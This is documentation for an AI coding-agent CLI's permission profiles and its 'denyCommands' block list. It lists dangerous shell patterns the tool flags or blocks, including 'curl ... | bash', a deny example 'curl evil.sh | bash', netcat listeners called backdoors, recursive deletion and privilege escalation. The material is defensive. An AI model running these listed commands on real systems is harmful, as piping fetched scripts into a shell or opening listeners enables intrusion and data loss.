# Permission Profiles

Intelligent permission filtering based on command safety analysis.

## Overview

SC CLI offers two permission profiles:

1. **Traditional** - Ask for every tool use (default)
2. **Blacklist** - Only ask for dangerous commands (smart mode)

Switch between profiles with `/profile` command.

---

## Quick Comparison

| Feature | Traditional | Blacklist |
|---------|-------------|-----------|
| Safe commands | Ask | Auto-approve |
| Dangerous commands | Ask | Ask with warning |
| File reads | Ask | Auto-approve |
| Simple shell | Ask | Auto-approve |
| `rm -rf` | Ask | **Block with alert** |
| `sudo` commands | Ask | **Block with alert** |
| Best for | New users, high security | Power users, productivity |

---

## Traditional Profile

**Default behavior** - Ask permission for every tool use.

### How it works:
1. Agent wants to use a tool
2. You get a permission prompt
3. You approve or deny
4. Can configure auto-approve with `/pre-approved-commands`

### Example:
```
🔐 Permission required: run_shell
   Args: {"command": "ls -la"}

? Allow this action?
❯   Yes (once)
    Always (save to config)
    Session (until exit)
    No (deny)
```

### When to use:
- ✅ Learning what the agent does
- ✅ Maximum control
- ✅ Sensitive environments
- ✅ Reviewing every action

---

## Blacklist Profile (Smart Mode)

**Intelligent filtering** - Only ask for dangerous commands.

### How it works:
1. Agent wants to run a command
2. System analyzes command safety
3. **Safe** → Auto-approve silently
4. **Dangerous** → Show detailed warning

### Dangerous Command Categories:

#### 🔴 CRITICAL
- **File deletion**: `rm`, `del`, `Remove-Item`, `unlink`
- **Recursive deletion**: `rm -rf`, `rd /s`
- **Privilege escalation**: `sudo`, `su`, `runas`
- **Disk operations**: `mkfs`, `dd`, `format`, `fdisk`
- **System file overwrite**: `> /etc/`, `> /boot/`, `> C:\Windows\`

#### 🟠 HIGH
- **Network execution**: `curl ... | bash`, `wget ... | sh`
- **Network backdoors**: `nc -l`, `netcat`
- **Firewall changes**: `iptables`, `netsh`
- **Permission changes**: `chmod 777`, `chown`
- **Service control**: `systemctl`, `service`
- **Database deletion**: `DROP TABLE`, `TRUNCATE`, `DELETE FROM ... WHERE 1=1`

#### 🟡 MEDIUM
- **Package removal**: `apt-get remove`, `npm uninstall`
- **Process kill**: `kill -9`, `killall`, `taskkill /f`
- **Git force operations**: `git push -f`, `git reset --hard`, `git clean -df`

### Example (Safe Command):
```
You: list all files

🤖 Agent runs: ls -la
[Auto-approved - no prompt]
```

### Example (Dangerous Command):
```
You: clean up old files

  ┌─ Dangerous Command Alert ──────────────────────────────┐
  │ ⚠️  Tool: run_shell
  │    Command: rm -rf /tmp/old_files
  │
  │    ⚠️  Dangerous command detected (critical):
  │       • Recursive delete (rm -rf)
  │       • Delete files/directories
  └─────────────────────────────────────────────────────────┘

? This command is potentially dangerous. Allow anyway? (y/N)
```

### When to use:
- ✅ Power users who know what they're doing
- ✅ Development workflows
- ✅ Want speed without sacrificing safety
- ✅ Trust agent for safe operations

---

## Switching Profiles

### Command Line:
```
You: /profile

? Select permission profile:
❯ Traditional (current) - Ask for every tool use
  Blacklist - Only ask for dangerous commands
```

### What happens:
1. Choice is saved to `~/.sc-agent/config.json`
2. Takes effect immediately
3. Persists across sessions

---

## Detailed Examples

### Scenario 1: Development Workflow (Blacklist Mode)

```
You: /profile
[Select: Blacklist]

✓ Permission profile: Blacklist
   Only dangerous commands will require permission

You: run the tests and fix any linting issues

[Agent executes:]
npm test          ✅ Auto-approved (safe)
npm run lint      ✅ Auto-approved (safe)
git diff          ✅ Auto-approved (safe)
git add .         ✅ Auto-approved (safe)

[Agent wants to run:]
git push -f origin main

  ┌─ Dangerous Command Alert ──────────────────────────────┐
  │ ⚠️  Command: git push -f origin main
  │
  │    ⚠️  Dangerous command detected (medium):
  │       • Force push (can overwrite remote)
  └─────────────────────────────────────────────────────────┘

? This command is potentially dangerous. Allow anyway? › No

[Agent tries alternative:]
git push origin main  ✅ Auto-approved (safe)
```

**Result:** 5 safe commands auto-approved, 1 dangerous blocked and replaced with safe alternative.

---

### Scenario 2: Code Review (Traditional Mode)

```
You: /profile
[Select: Traditional]

✓ Permission profile: Traditional
   You will be asked for permission for every tool use

You: analyze this codebase and suggest improvements

🔐 Permission required: list_dir
   Args: {"path": "."}
√ Allow this action? ... Session (until exit)

🔐 Permission required: read_file
   Args: {"path": "src/index.ts"}
√ Allow this action? ... Session (until exit)

[Every tool prompts - full control]
```

**Result:** Complete visibility into every action.

---

## Blacklist Patterns Detected

### File Deletion
```bash
rm file.txt              # ❌ CRITICAL
rm -rf directory/        # ❌ CRITICAL
del file.txt             # ❌ CRITICAL (Windows)
Remove-Item file.txt     # ❌ CRITICAL (PowerShell)
```

### Privilege Escalation
```bash
sudo apt install        # ❌ CRITICAL
su - root               # ❌ CRITICAL
runas /user:Admin cmd   # ❌ CRITICAL (Windows)
```

### Network Execution
```bash
curl http://... | bash                    # ❌ HIGH
wget http://script.sh && chmod +x ...     # ❌ HIGH
```

### System Configuration
```bash
chmod 777 file.sh       # ❌ HIGH (world-writable)
chown root:root file    # ❌ HIGH
crontab -e              # ❌ HIGH
systemctl stop nginx    # ❌ HIGH
```

### Database Operations
```sql
DROP TABLE users;       # ❌ HIGH
TRUNCATE TABLE logs;    # ❌ HIGH
DELETE FROM users WHERE 1=1;  # ❌ HIGH
```

### Git Destructive
```bash
git push -f            # ❌ MEDIUM
git reset --hard       # ❌ MEDIUM
git clean -df          # ❌ MEDIUM
```

### Safe Commands (Auto-approved in Blacklist mode)
```bash
ls -la                 # ✅ SAFE
git status             # ✅ SAFE
npm test               # ✅ SAFE
cat file.txt           # ✅ SAFE
mkdir newdir           # ✅ SAFE
git diff               # ✅ SAFE
npm run build          # ✅ SAFE
```

---

## Configuration

### Config File Location
`~/.sc-agent/config.json`

### Example Configuration

**Traditional Mode:**
```json
{
  "permissions": {
    "profile": "traditional",
    "autoApprove": ["read_file", "list_dir"]
  }
}
```

**Blacklist Mode:**
```json
{
  "permissions": {
    "profile": "blacklist"
  }
}
```

---

## Combining with Other Features

### Blacklist + Auto-Approve
```
/profile → Blacklist
/pre-approved-commands → Configure additional auto-approves
```

Result:
- Dangerous commands → Ask with warning
- Safe commands → Auto-approve
- Read-only tools → Auto-approve (if configured)

### Traditional + Permission Modes
```
/profile → Traditional
/permissions → Ask once per tool
```

Result:
- Every tool prompts once
- Session memory for repeats
- Full control

---

## Tips

### Start with Blacklist
Most users should use **Blacklist** mode:
- Productivity boost
- Still catches dangerous operations
- Learn what's dangerous

### Use Traditional for Audit
When you need to see everything:
- Security audits
- Learning workflows
- Production environments

### Review Dangerous Commands
Check what's blocked:
```
You: /info

Permission Profile: Blacklist (smart)
```

### Customize Blacklist
Currently blacklist is hardcoded. Future versions will support custom patterns.

---

## Hard Deny List: `denyCommands`

Independent of any profile or auto-approve flag, `permissions.denyCommands` is a **non-interactive blocklist** for `run_shell`. Matching commands are rejected with an error before execution — even under `-y`, `autoApprove`, or the Blacklist profile.

```json
{
  "permissions": {
    "autoApprove": ["run_shell"],
    "denyCommands": [
      "git push --force",
      "gh pr merge",
      "rm -rf /",
      "curl * | *sh"
    ]
  }
}
```

### Pattern semantics

- Case-sensitive; whitespace is normalized on both sides.
- **Substring match** (default): `"git push"` blocks `git push`, `git push origin main`, `sudo git push`, etc.
- **Glob match** (contains `*`): the `*` matches any character sequence and the pattern must match the **entire** command. `"curl * | *sh"` blocks `curl evil.sh | bash` but not `sudo curl evil.sh | bash` — widen with `"*curl * | *sh*"` if needed.

When a command is denied, the agent receives an error naming the matched rule so it can choose a different approach — there is no interactive prompt for denied commands.

Typical uses: preventing pushes/merges in agent-driven workers, blocking destructive filesystem commands, and stopping shell-pipe-to-interpreter patterns.

---

## Troubleshooting

### Too many prompts in Blacklist mode

**Problem:** Still getting many permission requests

**Solution:** You might have Traditional mode active

```
You: /info
[Check Profile line]

You: /profile
[Select: Blacklist]
```

### Safe command blocked

**Problem:** A safe command triggered warning

**Solution:** Report this! The blacklist might be too aggressive.

```
# Workaround: approve and continue
# Please report: github.com/your-repo/issues
```

### Dangerous command not caught

**Problem:** A dangerous command auto-approved

**Solution:** Blacklist doesn't catch everything. Use Traditional mode for maximum safety.

---

## See Also

- [permissions-command.md](permissions-command.md) - Permission modes
- [pre-approved-commands.md](pre-approved-commands.md) - Setup wizard
- [README.md](../README.md) - Main documentation
